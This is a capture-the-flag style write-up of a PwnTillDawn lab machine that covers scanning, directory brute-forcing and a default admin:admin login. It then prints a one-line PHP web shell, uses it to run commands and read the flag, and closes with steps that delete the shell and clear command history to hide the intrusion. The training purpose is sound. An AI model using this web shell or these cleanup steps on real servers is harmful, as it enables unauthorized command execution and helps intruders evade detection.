<h1>Report: PwnTillDawn - Easy File Upload Exploitation</h1>

<p>
  <strong>Project Description:</strong><br />
  This report documents a comprehensive penetration testing engagement against the target machine <strong>10.150.150.11 (PwnTillDawn Lab)</strong>. 
  The objective was to enumerate the target, identify vulnerabilities, gain initial access, capture the flag, and clear tracks. 
  The attack methodology followed a structured approach including VPN connection, network reconnaissance, port scanning with Nmap, 
  directory brute-forcing with GoBuster, authentication bypass using default credentials, PHP web shell upload, command execution, 
  flag retrieval, and evidence removal. Key techniques used include full port scanning, service version detection, hidden directory enumeration, 
  web shell creation and upload, remote command execution via HTTP GET parameters, and forensic cleanup. This walkthrough demonstrates 
  a real-world web application attack path and serves as a learning resource for ethical hacking and cybersecurity practices.
</p>

<br />

<table border="0" cellpadding="10">
  <thead>
    <tr>
      <th width="5%">Step</th>
      <th width="35%">Activity / Findings</th>
      <th width="20%">Command / Details</th>
      <th width="40%">Screenshot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Connect to the PwnTillDawn lab VPN using OpenVPN to establish access to the isolated lab network</td>
      <td><code>sudo openvpn --config pwnstilldawn.ovpn</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/7f569dce-42ef-41c0-bce0-235a607def5c" /></td>
    </tr>
    <tr>
      <td>2</td>
      <td>Identify the target machine by pinging the assigned IP address to verify connectivity and ensure the host is alive</td>
      <td><code>ping 10.150.150.11</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/f4d8d2e9-25c4-446a-9b05-c8f2c9b935ba" /></td>
    </tr>
    <tr>
      <td>3</td>
      <td>Perform an initial full port scan against all 65,535 TCP ports to discover open ports and the overall attack surface</td>
      <td><code>nmap -p- 10.150.150.11</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/d8d94bb9-c13a-4bf8-be7d-6b552ea94b2c" /></td>
    </tr>
    <tr>
      <td>4</td>
      <td>Run a deep service version scan with default scripts to identify software versions, operating system, and running services like Apache, PHP, and SMB shares</td>
      <td><code>nmap -sC -sV -Pn 10.150.150.11</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/a34bba01-dd42-4b83-8a14-7294a9701272" /></td>
    </tr>
    <tr>
      <td>5</td>
      <td>Perform directory brute-forcing using GoBuster to discover hidden directories, files, and endpoints not linked from the main page</td>
      <td><code>gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/890ea372-8ee7-490b-ad02-45c5de6943e8" /></td>
    </tr>
    <tr>
      <td>6</td>
      <td>Browse the main web page to identify the running web application — an "Easy File Upload" system with a file upload form</td>
      <td>Navigate to <code>http://10.150.150.11</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/96143955-e9e5-465f-ab37-e67b9650d799" /></td>
    </tr>
    <tr>
      <td>7</td>
      <td>Bypass authentication using default administrative credentials (admin:admin) or simple SQL injection to gain unauthorized access to restricted areas</td>
      <td>Username: <code>admin</code><br />Password: <code>admin</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/f51bb341-de46-4e56-8a16-0b8f9602d54c" /></td>
    </tr>
    <tr>
      <td>8</td>
      <td>Create a simple PHP web shell that executes system commands via URL parameter, then upload it through the file upload form</td>
      <td>
        <strong>Create:</strong> <code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code><br /><br />
        <strong>Upload:</strong> <code>http://10.150.150.11/upload.php</code>
       </td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/8246eb19-8393-4855-b603-cdbd625489ff" /></td>
    </tr>
    <tr>
      <td>9</td>
      <td>Test the uploaded web shell by executing the whoami command to verify functionality and check current user privileges</td>
      <td><code>http://10.150.150.11/upload/2/shell.php?cmd=whoami</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/18ca5a86-045a-4864-b243-05c6ff7b23a6" /></td>
    </tr>
    <tr>
      <td>10</td>
      <td>Read the flag file located on the Administrator's desktop to confirm successful compromise of the target system</td>
      <td><code>http://10.150.150.11/upload/2/shell.php?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/2f8211bc-6c7b-48c0-850d-8f73ecc4a2fd" /></td>
    </tr>
    <tr>
      <td>11</td>
      <td>Delete the uploaded web shell from the server to hide evidence of the intrusion and avoid detection by system administrators</td>
      <td><code>http://10.150.150.11/upload/2/shell.php?cmd=del C:\path\to\upload\2\shell.php</code></td>
      <td>
        <img width="100%" src="https://github.com/user-attachments/assets/7462a876-7c3f-412f-8aca-8e46e260a74b" /><br /><br />
        <strong>Proof shell is deleted:</strong><br />
        <img width="100%" src="https://github.com/user-attachments/assets/aef1d3d7-aa57-4cb7-bed1-5a08567e92a7" />
       </td>
    </tr>
    <tr>
      <td>12</td>
      <td>Clear the command history on the target system using doskey/reinstall to remove traces of executed commands from logs</td>
      <td><code>http://10.150.150.11/upload/2/shell.php?cmd=doskey/reinstall</code></td>
      <td><img width="100%" src="https://github.com/user-attachments/assets/a5748ad1-3291-4449-bb55-91f8761bdb29" /></td>
    </tr>
  </tbody>
</table>
